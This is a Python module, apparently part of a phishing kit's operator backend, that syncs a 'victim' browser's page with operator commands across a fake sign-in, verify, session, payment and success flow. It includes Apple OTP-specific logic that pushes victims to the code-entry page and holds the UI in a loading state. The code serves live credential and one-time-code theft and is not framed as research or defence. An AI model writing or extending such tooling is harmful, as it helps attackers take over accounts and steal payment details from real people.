"""Victim page route sync: operator commands vs victim-reported path (remote meta)."""

from __future__ import annotations

import time
from dataclasses import dataclass

ROUTE_ORDER = ('/signin', '/verify', '/session', '/loading', '/payment', '/flow', '/success')


def route_rank(path: str) -> int:
    p = normalize_path(path)
    try:
        return ROUTE_ORDER.index(p)
    except ValueError:
        return 0


def normalize_path(path: str) -> str:
    p = (path or '/').strip()
    if not p.startswith('/'):
        p = '/' + p
    p = p.rstrip('/') or '/'
    return p


@dataclass
class VictimRouteSync:
    """Tracks where the victim browser is vs where the operator wants it."""

    reported_path: str = '/signin'
    commanded_path: str = '/signin'
    loading_until: float = 0.0
    last_nav_at: float = 0.0

    def ingest_meta(self, path: str) -> None:
        """Ground truth from victim browser (meta events)."""
        p = normalize_path(path)
        self.reported_path = p
        if p == self.commanded_path:
            self.loading_until = 0.0

    def operator_path(self) -> str:
        """Path the mirror should assume for OTP / UI logic."""
        if route_rank(self.commanded_path) > route_rank(self.reported_path):
            return self.commanded_path
        return self.reported_path

    def mark_commanded(self, path: str) -> None:
        p = normalize_path(path)
        self.commanded_path = p
        self.loading_until = time.time() + 25.0
        self.last_nav_at = time.time()

    def navigation_settled(self) -> bool:
        return self.commanded_path == self.reported_path

    def needs_nav_retry(self) -> bool:
        if self.navigation_settled():
            return False
        return time.time() - self.last_nav_at > 8.0

    def should_block_ui(self, *, apple_otp_ready: bool, otp_verifying: bool) -> bool:
        if self.navigation_settled():
            return False
        if (
            apple_otp_ready
            and self.commanded_path == '/verify'
            and self.reported_path == '/verify'
            and not otp_verifying
        ):
            return False
        return time.time() < self.loading_until


def pick_apple_victim_path(
    desired: str,
    last_route: str,
    *,
    apple_otp_ready: bool,
) -> str:
    if apple_otp_ready:
        return '/verify'
    desired = normalize_path(desired or last_route)
    last_route = normalize_path(last_route)
    if route_rank(desired) >= route_rank(last_route):
        return desired
    return last_route
